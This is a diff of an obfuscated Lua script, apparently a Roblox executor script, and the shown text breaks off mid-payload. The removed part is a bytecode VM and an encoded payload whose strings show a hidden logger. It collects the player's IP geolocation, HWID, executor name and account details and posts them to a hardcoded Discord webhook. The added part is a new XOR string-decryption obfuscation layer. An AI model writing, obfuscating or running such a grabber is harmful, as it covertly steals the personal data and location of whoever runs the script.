@@ -9,537 +9,233 @@
 ###       ###       ###    ###  ########  #########  
 
 ]]--
-
-local StrToNumber = tonumber;
-local Byte = string.byte;
-local Char = string.char;
-local Sub = string.sub;
-local Subg = string.gsub;
-local Rep = string.rep;
-local Concat = table.concat;
-local Insert = table.insert;
-local LDExp = math.ldexp;
-local GetFEnv = getfenv or function()
-	return _ENV;
+bit32 = {};
+local N = 32;
+local P = 2 ^ N;
+bit32.bnot = function(x)
+	x = x % P;
+	return (P - 1) - x;
 end;
-local Setmetatable = setmetatable;
-local PCall = pcall;
-local Select = select;
-local Unpack = unpack or table.unpack;
-local ToNumber = tonumber;
-local function VMCall(ByteString, vmenv, ...)
-	local DIP = 2 - 1;
-	local repeatNext;
-	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
-		if (((13848 - 9009) >= (7142 - 3442)) and (Byte(byte, 4 - 2) == 81)) then
-			repeatNext = StrToNumber(Sub(byte, 1, 1));
-			return "";
-		else
-			local a = Char(StrToNumber(byte, 635 - (555 + 64)));
-			if repeatNext then
-				local b = Rep(a, repeatNext);
-				repeatNext = nil;
-				return b;
-			else
-				return a;
-			end
+bit32.band = function(x, y)
+	if (y == 255) then
+		return x % 256;
+	end
+	if (y == 65535) then
+		return x % 65536;
+	end
+	if (y == 4294967295) then
+		return x % 4294967296;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 2) then
+			r = r + p;
 		end
-	end);
-	local function gBit(Bit, Start, End)
-		if (End or ((5524 - (857 + 74)) <= 2672) or ((1643 - (367 + 201)) > (2845 - (214 + 713)))) then
-			local Res = (Bit / ((1 + 1) ^ (Start - 1))) % ((1 + 1) ^ (((End - 1) - (Start - (878 - (282 + 595)))) + 1));
-			return Res - (Res % 1);
-		else
-			local Plc = 2 ^ (Start - (1638 - (1523 + 114)));
-			return (((Bit % (Plc + Plc)) >= Plc) and (1 + 0)) or 0;
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bor = function(x, y)
+	if (y == 255) then
+		return (x - (x % 256)) + 255;
+	end
+	if (y == 65535) then
+		return (x - (x % 65536)) + 65535;
+	end
+	if (y == 4294967295) then
+		return 4294967295;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) >= 1) then
+			r = r + p;
 		end
+		p = 2 * p;
 	end
-	local function gBits8()
-		local a = Byte(ByteString, DIP, DIP);
-		DIP = DIP + (1 - 0);
-		return a;
-	end
-	local function gBits16()
-		local a, b = Byte(ByteString, DIP, DIP + (1067 - (68 + 997)));
-		DIP = DIP + (1272 - (226 + 1044));
-		return (b * 256) + a;
-	end
-	local function gBits32()
-		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
-		DIP = DIP + (17 - 13);
-		return (d * (16777333 - (32 + 85))) + (c * 65536) + (b * (251 + 5)) + a;
-	end
-	local function gFloat()
-		local Left = gBits32();
-		local Right = gBits32();
-		local IsNormal = 1;
-		local Mantissa = (gBit(Right, 1 + 0, 977 - (892 + 65)) * ((4 - 2) ^ 32)) + Left;
-		local Exponent = gBit(Right, 21, 31);
-		local Sign = ((gBit(Right, 32) == 1) and -(1 - 0)) or (1 - 0);
-		if (Exponent == (350 - (87 + 263))) then
-			if (((576 - (67 + 113)) <= 3804) and ((Mantissa == (0 + 0)) or ((2867 - 1699) > (2322 + 834)))) then
-				return Sign * (0 - 0);
-			else
-				Exponent = 953 - (802 + 150);
-				IsNormal = 0;
-			end
-		elseif ((Exponent == 2047) or ((1539 - 967) > 4486)) then
-			return ((Mantissa == 0) and (Sign * ((1 - 0) / 0))) or (Sign * NaN);
+	return r;
+end;
+bit32.bxor = function(x, y)
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 1) then
+			r = r + p;
 		end
-		return LDExp(Sign, Exponent - (745 + 278)) * (IsNormal + (Mantissa / ((999 - (915 + 82)) ^ (147 - 95))));
+		p = 2 * p;
 	end
-	local function gString(Len)
-		local Str;
-		if (not Len or ((2429 + 1740) == (2875 - 688))) then
-			Len = gBits32();
-			if (Len == 0) then
-				return "";
-			end
-		end
-		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
-		DIP = DIP + Len;
-		local FStr = {};
-		for Idx = 1188 - (1069 + 118), #Str do
-			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
-		end
-		return Concat(FStr);
+	return r;
+end;
+bit32.lshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
 	end
-	local gInt = gBits32;
-	local function _R(...)
-		return {...}, Select("#", ...);
+	x = x % P;
+	if (s_amount < 0) then
+		return math.floor(x * (2 ^ s_amount));
+	else
+		return (x * (2 ^ s_amount)) % P;
 	end
-	local function Deserialize()
-		local Instrs = {};
-		local Functions = {};
-		local Lines = {};
-		local Chunk = {Instrs,Functions,nil,Lines};
-		local ConstCount = gBits32();
-		local Consts = {};
-		for Idx = 1 - 0, ConstCount do
-			local Type = gBits8();
-			local Cons;
-			if ((1404 == (245 + 1159)) and (Type == (1 - 0))) then
-				Cons = gBits8() ~= 0;
-			elseif ((1406 == (1395 + 11)) and (Type == 2)) then
-				Cons = gFloat();
-			elseif (((2322 - (368 + 423)) < (13422 - 9151)) and (Type == (21 - (10 + 8)))) then
-				Cons = gString();
-			end
-			Consts[Idx] = Cons;
-		end
-		Chunk[3] = gBits8();
-		for Idx = 3 - 2, gBits32() do
-			local Descriptor = gBits8();
-			if (((1077 - (416 + 26)) == (2027 - 1392)) and ((gBit(Descriptor, 1, 1 + 0) == (0 - 0)) or ((4186 - (145 + 293)) < 2212))) then
-				local Type = gBit(Descriptor, 432 - (44 + 386), 1489 - (998 + 488));
-				local Mask = gBit(Descriptor, 2 + 2, 6);
-				local Inst = {gBits16(),gBits16(),nil,nil};
-				if ((Type == 0) or (1180 == 2180)) then
-					Inst[3] = gBits16();
-					Inst[4] = gBits16();
-				elseif (((5228 - (116 + 1022)) < (19371 - 14718)) and (Type == 1)) then
-					Inst[2 + 1] = gBits32();
-				elseif ((3373 <= 3556) and (Type == 2)) then
-					Inst[3] = gBits32() - ((7 - 5) ^ 16);
-				elseif ((Type == 3) or (3291 < (11647 - 8367))) then
-					Inst[3] = gBits32() - ((861 - (814 + 45)) ^ 16);
-					Inst[9 - 5] = gBits16();
-				end
-				if ((gBit(Mask, 1, 1) == 1) or ((143 + 2509) < (70 + 126))) then
-					Inst[887 - (261 + 624)] = Consts[Inst[2]];
-				end
-				if ((4135 < (8560 - 3743)) and (gBit(Mask, 2, 1082 - (1020 + 60)) == (1424 - (630 + 793)))) then
-					Inst[9 - 6] = Consts[Inst[14 - 11]];
-				end
-				if ((4386 >= (344 + 529)) and (gBit(Mask, 3, 3) == (3 - 2))) then
-					Inst[1751 - (760 + 987)] = Consts[Inst[1917 - (1789 + 124)]];
-				end
-				Instrs[Idx] = Inst;
-			end
-		end
-		for Idx = 1, gBits32() do
-			Functions[Idx - 1] = Deserialize();
-		end
-		return Chunk;
+end;
+bit32.rshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
 	end
-	local function Wrap(Chunk, Upvalues, Env)
-		local Instr = Chunk[767 - (745 + 21)];
-		local Proto = Chunk[2];
-		local Params = Chunk[3];
-		return function(...)
-			local Instr = Instr;
-			local Proto = Proto;
-			local Params = Params;
-			local _R = _R;
-			local VIP = 1 + 0;
-			local Top = -1;
-			local Vararg = {};
-			local Args = {...};
-			local PCount = Select("#", ...) - 1;
-			local Lupvals = {};
-			local Stk = {};
-			for Idx = 0 - 0, PCount do
-				if ((921 <= 1102) and (Idx >= Params)) then
-					Vararg[Idx - Params] = Args[Idx + 1 + 0];
-				else
-					Stk[Idx] = Args[Idx + 1];
-				end
-			end
-			local Varargsz = (PCount - Params) + 1 + 0;
-			local Inst;
-			local Enum;
-			while true do
-				Inst = Instr[VIP];
-				Enum = Inst[1];
-				if (((1327 - (87 + 968)) == 272) and (Enum <= (123 - 95))) then
-					if (((4270 + 436) >= 963) and (Enum <= (29 - 16))) then
-						if (Enum <= (1419 - (447 + 966))) then
-							if ((((273 - 173) <= (4940 - (1703 + 114))) and (Enum <= 2)) or ((1661 - (376 + 325)) <= (1435 - 559))) then
-								if (Enum <= 0) then
-									local A = Inst[5 - 3];
-									Stk[A] = Stk[A](Stk[A + 1]);
-								elseif ((Enum > 1) or ((591 + 1475) == (2052 - 1120))) then
-									do
-										return;
-									end
-								else
-									Stk[Inst[2]] = Upvalues[Inst[3]];
-								end
-							elseif (((4839 - (9 + 5)) < (5219 - (85 + 291))) and (Enum <= 4)) then
-								if ((Enum > (1268 - (243 + 1022))) or (3877 >= (17263 - 12726))) then
-									VIP = Inst[3];
-								else
-									local B = Stk[Inst[4 + 0]];
-									if (not B or (1369 > (6167 - (1123 + 57)))) then
-										VIP = VIP + 1 + 0;
-									else
-										Stk[Inst[256 - (163 + 91)]] = B;
-										VIP = Inst[1933 - (1869 + 61)];
-									end
-								end
-							elseif (Enum > (2 + 3)) then
-								if Stk[Inst[6 - 4]] then
-									VIP = VIP + (1 - 0);
-								else
-									VIP = Inst[3];
-								end
-							else
-								local A = Inst[1 + 1];
-								Stk[A] = Stk[A](Unpack(Stk, A + (1 - 0), Inst[3 + 0]));
-							end
-						elseif (Enum <= 9) then
-							if ((Enum <= 7) or (4315 < 1726)) then
-								if ((Inst[1476 - (1329 + 145)] == Stk[Inst[975 - (140 + 831)]]) or (3679 < (2475 - (1409 + 441)))) then
-									VIP = VIP + 1;
-								else
-									VIP = Inst[3];
-								end
-							elseif ((Enum == (726 - (15 + 703))) or ((2142 + 2483) < 632)) then
-								local A = Inst[2];
-								local C = Inst[442 - (262 + 176)];
-								local CB = A + (1723 - (345 + 1376));
-								local Result = {Stk[A](Stk[A + 1], Stk[CB])};
-								for Idx = 1, C do
-									Stk[CB + Idx] = Result[Idx];
-								end
-								local R = Result[689 - (198 + 490)];
-								if (R or ((3812 - 2949) >= 4584) or (83 > 1780)) then
-									Stk[CB] = R;
-									VIP = Inst[6 - 3];
-								else
-									VIP = VIP + (1207 - (696 + 510));
-								end
-							else
-								Stk[Inst[3 - 1]] = Inst[3];
-							end
-						elseif (Enum <= (1273 - (1091 + 171))) then
-							if ((546 <= (174 + 903)) and ((Enum > 10) or (724 >= 1668))) then
-								local A = Inst[2];
-								local B = Stk[Inst[3]];
-								Stk[A + (3 - 2)] = B;
-								Stk[A] = B[Inst[12 - 8]];
-							else
-								Stk[Inst[2]][Inst[377 - (123 + 251)]] = Inst[19 - 15];
-							end
-						elseif (Enum == 12) then
-							local B = Stk[Inst[702 - (208 + 490)]];
-							if ((((37 + 391) < (804 + 1000)) and B) or ((1832 - (660 + 176)) > 4301)) then
-								VIP = VIP + 1 + 0;
-							else
-								Stk[Inst[204 - (14 + 188)]] = B;
-								VIP = Inst[678 - (534 + 141)];
-							end
-						else
-							for Idx = Inst[1 + 1], Inst[3 + 0] do
-								Stk[Idx] = nil;
-							end
-						end
-					elseif ((4070 > (661 + 26)) and ((Enum <= 20) or ((6987 - 3662) > 4613))) then
-						if (Enum <= (25 - 9)) then
-							if ((Enum <= (39 - 25)) or (4950 <= (2445 + 2108)) or ((418 + 238) >= (3726 - (115 + 281)))) then
-								local A = Inst[4 - 2];
-								local Results = {Stk[A](Stk[A + 1 + 0])};
-								local Edx = 0 - 0;
-								for Idx = A, Inst[4] do
-									Edx = Edx + 1;
-									Stk[Idx] = Results[Edx];
-								end
-							elseif ((((9772 - 7107) <= 3933) and (Enum > (882 - (550 + 317)))) or ((3600 - 1108) <= (470 - 135))) then
-								local A = Inst[5 - 3];
-								local T = Stk[A];
-								for Idx = A + (286 - (134 + 151)), Inst[1668 - (970 + 695)] do
-									Insert(T, Stk[Idx]);
-								end
-							else
-								local A = Inst[3 - 1];
-								local Results = {Stk[A](Stk[A + 1])};
-								local Edx = 1990 - (582 + 1408);
-								for Idx = A, Inst[13 - 9] do
-									Edx = Edx + 1;
-									Stk[Idx] = Results[Edx];
-								end
-							end
-						elseif (((5437 - 1115) >= (9654 - 7092)) and (Enum <= 18)) then
-							if (((3273 == 3273) and (Enum > (1841 - (1195 + 629)))) or (3637 >= 3770)) then
-								local A = Inst[2 - 0];
-								local C = Inst[4];
-								local CB = A + (243 - (187 + 54));
-								local Result = {Stk[A](Stk[A + 1], Stk[CB])};
-								for Idx = 1, C do
-									Stk[CB + Idx] = Result[Idx];
-								end
-								local R = Result[1];
-								if (((3824 > (287 + 122)) and R) or ((1585 + 794) > 4578)) then
-									Stk[CB] = R;
-									VIP = Inst[3];
-								else
-									VIP = VIP + (1 - 0);
-								end
-							else
-								local A = Inst[2 - 0];
-								Stk[A] = Stk[A]();
-							end
-						elseif (Enum == 19) then
-							local B = Inst[3];
-							local K = Stk[B];
-							for Idx = B + 1 + 0, Inst[4] do
-								K = K .. Stk[Idx];
-							end
-							Stk[Inst[2]] = K;
-						else
-							local NewProto = Proto[Inst[3]];
-							local NewUvals;
-							local Indexes = {};
-							NewUvals = Setmetatable({}, {__index=function(_, Key)
-								local Val = Indexes[Key];
-								return Val[1][Val[2]];
-							end,__newindex=function(_, Key, Value)
-								local Val = Indexes[Key];
-								Val[1637 - (1373 + 263)][Val[2]] = Value;
-							end});
-							for Idx = 1, Inst[4] do
-								VIP = VIP + (1001 - (451 + 549));
-								local Mvm = Instr[VIP];
-								if ((2087 == (659 + 1428)) and (Mvm[1 - 0] == 43)) then
-									Indexes[Idx - 1] = {Stk,Mvm[1387 - (746 + 638)]};
-								else
-									Indexes[Idx - (1 + 0)] = {Upvalues,Mvm[3]};
-								end
-								Lupvals[#Lupvals + 1] = Indexes;
-							end
-							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
-						end
-					elseif ((Enum <= 24) or ((3745 - (218 + 123)) > (6084 - (1535 + 46)))) then
-						if ((Enum <= (22 + 0)) or ((508 + 2998) <= 1309)) then
-							if ((((3515 - (306 + 254)) == 2955) and (Enum > 21)) or (483 > (46 + 697))) then
-								local A = Inst[2];
-								Stk[A] = Stk[A](Unpack(Stk, A + (1 - 0), Inst[1470 - (899 + 568)]));
-							else
-								Upvalues[Inst[2 + 1]] = Stk[Inst[4 - 2]];
-							end
-						elseif (((3057 - (268 + 335)) > 578) and ((Enum == 23) or (2903 == 1495))) then
-							local NewProto = Proto[Inst[293 - (60 + 230)]];
-							local NewUvals;
-							local Indexes = {};
-							NewUvals = Setmetatable({}, {__index=function(_, Key)
-								local Val = Indexes[Key];
-								return Val[1][Val[2]];
-							end,__newindex=function(_, Key, Value)
-								local Val = Indexes[Key];
-								Val[573 - (426 + 146)][Val[1 + 1]] = Value;
-							end});
-							for Idx = 1457 - (282 + 1174), Inst[4] do
-								VIP = VIP + 1;
-								local Mvm = Instr[VIP];
-								if (Mvm[812 - (569 + 242)] == 43) then
-									Indexes[Idx - (2 - 1)] = {Stk,Mvm[1027 - (706 + 318)]};
-								else
-									Indexes[Idx - (1252 - (721 + 530))] = {Upvalues,Mvm[7 - 4]};
-								end
-								Lupvals[#Lupvals + 1] = Indexes;
-							end
-							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
-						else
-							local B = Stk[Inst[4]];
-							if (((4046 + 500) >= 2275) and not B) then
-								VIP = VIP + (701 - (271 + 429));
-							else
-								Stk[Inst[2]] = B;
-								VIP = Inst[3];
-							end
-						end
-					elseif (((855 + 75) < (5958 - (1408 + 92))) and (Enum <= (1112 - (461 + 625)))) then
-						if (((1950 - (993 + 295)) <= 972) and ((43 + 776) >= (1193 - (418 + 753))) and (Enum == 25)) then
-							local A = Inst[1 + 1];
-							Stk[A] = Stk[A](Stk[A + 1]);
-						else
-							Stk[Inst[2]][Inst[1 + 2]] = Stk[Inst[4]];
-						end
-					elseif (Enum == 27) then
-						Stk[Inst[1 + 1]][Inst[1 + 2]] = Inst[4];
-					else
-						local A = Inst[531 - (406 + 123)];
-						Stk[A] = Stk[A]();
-					end
-				elseif ((4370 == (6139 - (1749 + 20))) and (3162 == 3162) and (Enum <= 43)) then
-					if ((Enum <= (9 + 26)) or (4762 <= 861)) then
-						if (Enum <= (1353 - (1249 + 73))) then
-							if ((Enum <= 29) or (2369 > (1581 + 2848))) then
-								for Idx = Inst[1147 - (466 + 679)], Inst[6 - 3] do
-									Stk[Idx] = nil;
-								end
-							elseif (((11712 - 7617) >= 3183) and (Enum == 30)) then
-								Stk[Inst[1902 - (106 + 1794)]][Stk[Inst[3]]] = Stk[Inst[2 + 2]];
-							elseif Stk[Inst[2]] then
-								VIP = VIP + 1;
-							else
-								VIP = Inst[3];
-							end
-						elseif (Enum <= (9 + 24)) then
-							if ((Enum == 32) or ((4168 - 2756) == (11546 - 7282))) then
-								local A = Inst[2];
-								Stk[A](Stk[A + 1]);
-							else
-								Stk[Inst[2]] = {};
-							end
-						elseif ((Enum > 34) or ((3825 - (4 + 110)) < (1592 - (57 + 527)))) then
-							Stk[Inst[2]] = Upvalues[Inst[1430 - (41 + 1386)]];
-						else
-							VIP = Inst[3];
-						end
-					elseif ((Enum <= (142 - (17 + 86))) or (3168 < 2153)) then
-						if ((Enum <= 37) or ((3378 + 1598) < (2969 - 1637))) then
-							if ((Enum == (104 - 68)) or (1049 <= 906)) then
-								if (((4794 - (122 + 44)) == (7993 - 3365)) and (4513 > 2726) and (Stk[Inst[6 - 4]] == Inst[4 + 0])) then
-									VIP = VIP + 1 + 0;
-								else
-									VIP = Inst[5 - 2];
-								end
-							else
-								Stk[Inst[67 - (30 + 35)]][Inst[3 + 0]] = Stk[Inst[1261 - (1043 + 214)]];
-							end
-						elseif (Enum > 38) then
-							Stk[Inst[2]] = Stk[Inst[11 - 8]][Inst[1216 - (323 + 889)]];
-						else
-							Stk[Inst[5 - 3]] = Stk[Inst[3]][Inst[4]];
-						end
-					elseif ((Enum <= 41) or ((2061 - (361 + 219)) >= (2978 - (53 + 267))) or (54 == 395)) then
-						if (Enum > (10 + 30)) then
-							if ((82 == 82) and (Inst[415 - (15 + 398)] == Stk[Inst[986 - (18 + 964)]])) then
-								VIP = VIP + (3 - 2);
-							else
-								VIP = Inst[2 + 1];
-							end
-						else
-							Stk[Inst[2 + 0]] = Inst[853 - (20 + 830)];
-						end
-					elseif (Enum > (33 + 9)) then
-						Stk[Inst[128 - (116 + 10)]] = Stk[Inst[3]];
-					else
-						local B = Inst[1 + 2];
-						local K = Stk[B];
-						for Idx = B + 1, Inst[4] do
-							K = K .. Stk[Idx];
-						end
-						Stk[Inst[2]] = K;
-					end
-				elseif ((Enum <= (788 - (542 + 196))) or ((1245 - 664) < (83 + 199))) then
-					if (Enum <= 46) then
-						if ((Enum <= (23 + 21)) or ((1160 + 2060) == (3594 - 2230)) or ((11816 - 7207) < (4046 - (1126 + 425)))) then
-							Stk[Inst[407 - (118 + 287)]] = Stk[Inst[11 - 8]];
-						elseif (((2273 - (118 + 1003)) == 1152) and ((Enum > 45) or (1054 > 3392))) then
-							Stk[Inst[2]] = {};
-						elseif (((5548 - 3652) <= (3799 - (142 + 235))) and not Stk[Inst[9 - 7]]) then
-							VIP = VIP + 1;
-						else
-							VIP = Inst[3];
-						end
-					elseif (Enum <= (11 + 37)) then
-						if ((Enum > 47) or ((1967 - (553 + 424)) > (3063 - 1443))) then
-							local B = Stk[Inst[4]];
-							if (B or (877 > (4136 + 559))) then
-								VIP = VIP + 1;
-							else
-								Stk[Inst[2 + 0]] = B;
-								VIP = Inst[3];
-							end
-						else
-							Stk[Inst[2 + 0]][Stk[Inst[2 + 1]]] = Stk[Inst[3 + 1]];
-						end
-					elseif ((2691 >= (4012 - 2161)) and ((Enum == (136 - 87)) or ((1513 - 837) >= 1642))) then
-						if (((4136 > 2397) and not Stk[Inst[1 + 1]]) or (2985 >= 4856)) then
-							VIP = VIP + (4 - 3);
-						else
-							VIP = Inst[3];
-						end
-					else
-						Stk[Inst[755 - (239 + 514)]] = Env[Inst[3]];
-					end
-				elseif (Enum <= (19 + 35)) then
-					if ((Enum <= (1381 - (797 + 532))) or (4334 == 4245)) then
-						if (((3108 + 1168) >= 1195) and ((Enum == 51) or (4276 <= 3031))) then
-							local A = Inst[1 + 1];
-							local B = Stk[Inst[6 - 3]];
-							Stk[A + 1] = B;
-							Stk[A] = B[Inst[1206 - (373 + 829)]];
-						else
-							do
-								return;
-							end
-						end
-					elseif (((3963 - (476 + 255)) <= (5820 - (369 + 761))) and (Enum > (31 + 22))) then
-						Upvalues[Inst[5 - 2]] = Stk[Inst[3 - 1]];
-					else
-						local A = Inst[240 - (64 + 174)];
-						local T = Stk[A];
-						local B = Inst[3];
-						for Idx = 1, B do
-							T[Idx] = Stk[A + Idx];
-						end
-					end
-				elseif (Enum <= 56) then
-					if ((Enum > 55) or (896 >= (449 + 2697))) then
-						Stk[Inst[2 - 0]] = Env[Inst[339 - (144 + 192)]];
-					elseif ((Stk[Inst[2]] == Inst[220 - (42 + 174)]) or ((3593 + 1189) <= (994 + 205))) then
-						VIP = VIP + 1;
-					else
-						VIP = Inst[2 + 1];
-					end
-				elseif ((3061 >= 2958) and ((Enum == (1561 - (363 + 1141))) or ((6444 - (1183 + 397)) < (5790 - 3888)))) then
-					local A = Inst[2];
-					local T = Stk[A];
-					local B = Inst[3 + 0];
-					for Idx = 1, B do
-						T[Idx] = Stk[A + Idx];
-					end
-				else
-					local A = Inst[2];
-					Stk[A](Stk[A + 1]);
-				end
-				VIP = VIP + 1;
-			end
-		end;
+	x = x % P;
+	if (s_amount > 0) then
+		return math.floor(x * (2 ^ -s_amount));
+	else
+		return (x * (2 ^ -s_amount)) % P;
 	end
-	return Wrap(Deserialize(), {}, vmenv)(...);
+end;
+bit32.arshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		local add = 0;
+		if (x >= (P / 2)) then
+			add = P - (2 ^ (N - s_amount));
+		end
+		return math.floor(x * (2 ^ -s_amount)) + add;
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+local TABLE_TableIndirection = {};
+TABLE_TableIndirection["obf_stringchar%0"] = string.char;
+TABLE_TableIndirection["obf_stringbyte%0"] = string.byte;
+TABLE_TableIndirection["obf_stringsub%0"] = string.sub;
+TABLE_TableIndirection["obf_bitlib%0"] = bit32 or bit;
+TABLE_TableIndirection["obf_XOR%0"] = TABLE_TableIndirection["obf_bitlib%0"].bxor;
+TABLE_TableIndirection["obf_tableconcat%0"] = table.concat;
+TABLE_TableIndirection["obf_tableinsert%0"] = table.insert;
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+	TABLE_TableIndirection["result%0"] = {};
+	for i = 1, #LUAOBFUSACTOR_STR do
+		TABLE_TableIndirection["obf_tableinsert%0"](TABLE_TableIndirection["result%0"], TABLE_TableIndirection["obf_stringchar%0"](TABLE_TableIndirection["obf_XOR%0"](TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_STR, i, i + 1)), TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
+	end
+	return TABLE_TableIndirection["obf_tableconcat%0"](TABLE_TableIndirection["result%0"]);
 end
-return VMCall("LOL!433Q0003043Q0067616D65030A3Q0047657453657276696365030B3Q00482Q74705365727669636503073Q00506C617965727303123Q004D61726B6574706C61636553657276696365030B3Q004C6F63616C506C6179657203093Q00436861726163746572030E3Q00436861726163746572412Q64656403043Q005761697403163Q0046696E6446697273744368696C64576869636849734103083Q0048756D616E6F696403073Q00556E6B6E6F776E03073Q00636F756E747279030A3Q00726567696F6E4E616D6503043Q00636974792Q033Q007A69702Q033Q006973702Q033Q006F726703023Q00617303083Q0074696D657A6F6E652Q033Q006C617403013Q003F2Q033Q006C6F6E03053Q007063612Q6C03073Q00506C616365496403053Q004A6F624964031D3Q00682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F67616D65732F03103Q006964656E746966796578656375746F7203103Q00556E6B6E6F776E204578656375746F72030B3Q00446973706C61794E616D6503043Q004E616D6503063Q00557365724964030A3Q00412Q636F756E7441676503083Q00746F737472696E67030E3Q004D656D6265727368697054797065031D3Q00682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F75736572732F03083Q002F70726F66696C6503513Q00682Q7470733A2Q2F74722E72627863646E2E636F6D2F33666264303466363064633766316538613635646365386636623066646637362F3432302F3432302F4176617461724865616473686F742F506E6703023Q006F7303043Q006461746503083Q0025592D256D2D256403083Q0025483A254D3A255303793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313336332Q34373938333038353139313233382F62444E336B495F4543394B56475F694D66727868795462767271756F335975395551394D797A75773351676E744F794958356E7031364D684D614A4E4A6461426231746303053Q007469746C6503153Q00F09F93982046752Q6C2053652Q73696F6E204C6F6703053Q00636F6C6F72024Q00E0FFE74003093Q007468756D626E61696C2Q033Q0075726C03063Q006669656C647303043Q006E616D65030E3Q00F09F91A4205573657220496E666F03053Q0076616C756503063Q00737472696E6703063Q00666F726D617403663Q002Q2A446973706C6179204E616D652Q2A3A205B25735D282573290A2Q2A557365726E616D652Q2A3A2025730A2Q2A5573657249642Q2A3A2025730A2Q2A4D656D626572736869702Q2A3A2025730A2Q2A412Q636F756E74204167652Q2A3A202573206461797303063Q00696E6C696E65010003113Q00F09F92BB2053652Q73696F6E20496E666F03443Q002Q2A4578656375746F722Q2A3A2025730A2Q2A485749442Q2A3A20602573600A2Q2A4F532Q2A3A2025730A2Q2A446174652Q2A3A2025730A2Q2A54696D652Q2A3A202573030E3Q00F09F8EAE2047616D6520496E666F03723Q002Q2A47616D65204E616D652Q2A3A205B25735D282573290A2Q2A506C61636549642Q2A3A2025730A2Q2A4A6F696E205363726970742Q2A3A0A3Q606C75610A526F626C6F782E47616D654C61756E636865722E6A6F696E47616D65496E7374616E63652825732C2022257322290A3Q60030C3Q00F09F8C9020495020496E666F03943Q002Q2A495020412Q6472652Q732Q2A3A20602573600A2Q2A436F756E7472792Q2A3A2025730A2Q2A526567696F6E2Q2A3A2025730A2Q2A436974792Q2A3A2025730A2Q2A5A49502Q2A3A2025730A2Q2A4953502Q2A3A2025730A2Q2A4F72672Q2A3A2025730A2Q2A41532Q2A3A2025730A2Q2A54696D657A6F6E652Q2A3A2025730A2Q2A4C61742F4C6F6E2Q2A3A2025732C20257303063Q00662Q6F74657203043Q0074657874031F3Q00F09F948D2047656E657261746564206279204C6F2Q6765722053637269707400B13Q0012383Q00013Q0020335Q0002001228000200034Q00163Q00020002001238000100013Q002033000100010002001228000300044Q0016000100030002001238000200013Q002033000200020002001228000400054Q001600020004000200202700030001000600202700040003000700063100040013000100010004223Q001300010020270004000300080020330004000400094Q00040002000200203300050004000A0012280007000B4Q00160005000700020012280006000C4Q002100073Q000A00300A0007000D000C00300A0007000E000C00300A0007000F000C00300A00070010000C00300A00070011000C00300A00070012000C00300A00070013000C00300A00070014000C00300A00070015001600300A000700170016001238000800183Q00061400093Q000100032Q002B3Q00064Q002B8Q002B3Q00074Q00200008000200010012280008000C3Q001238000900183Q000614000A0001000100012Q002B3Q00084Q00200009000200010012280009000C3Q001238000A00183Q000614000B0002000100012Q002B3Q00094Q0020000A00020001001238000A00013Q002027000A000A0019001238000B00013Q002027000B000B001A001228000C001B4Q002C000D000A4Q0013000C000C000D001228000D000C3Q001238000E00183Q000614000F0003000100032Q002B3Q000D4Q002B3Q00024Q002B3Q000A4Q0020000E00020001001238000E001C3Q00061F000E004700013Q0004223Q00470001001238000E001C4Q0011000E00010002000631000E0048000100010004223Q00480001001228000E001D3Q002027000F0003001E00202700100003001F002027001100030020002027001200030021001238001300223Q0020270014000300234Q001300020002001228001400244Q002C001500113Q001228001600254Q0013001400140016001228001500263Q001238001600183Q00061400170004000100032Q002B3Q00154Q002B3Q00114Q002B8Q0020001600020001001238001600273Q002027001600160028001228001700296Q001600020002001238001700273Q0020270017001700280012280018002A6Q0017000200020012280018002B4Q002100193Q000500300A0019002C002D00300A0019002E002F2Q0021001A3Q0001001025001A0031001500102500190030001A2Q0021001A00044Q0021001B3Q000300300A001B00330034001238001C00363Q002027001C001C0037001228001D00384Q002C001E000F4Q002C001F00144Q002C002000104Q002C002100114Q002C002200134Q002C002300124Q0016001C00230002001025001B0035001C00300A001B0039003A2Q0021001C3Q000300300A001C0033003B001238001D00363Q002027001D001D0037001228001E003C4Q002C001F000E4Q002C002000084Q002C002100094Q002C002200164Q002C002300174Q0016001D00230002001025001C0035001D00300A001C0039003A2Q0021001D3Q000300300A001D0033003D001238001E00363Q002027001E001E0037001228001F003E4Q002C0020000D4Q002C0021000C4Q002C0022000A4Q002C0023000A4Q002C0024000B4Q0016001E00240002001025001D0035001E00300A001D0039003A2Q0021001E3Q000300300A001E0033003F001238001F00363Q002027001F001F0037001228002000404Q002C002100063Q00202700220007000D00202700230007000E00202700240007000F002027002500070010002027002600070011002027002700070012002027002800070013002027002900070014002027002A00070015002027002B000700172Q0016001F002B0002001025001E0035001F00300A001E0039003A2Q0035001A0004000100102500190032001A2Q0021001A3Q000100300A001A0042004300102500190041001A001238001A00183Q000614001B0005000100032Q002B3Q00184Q002B3Q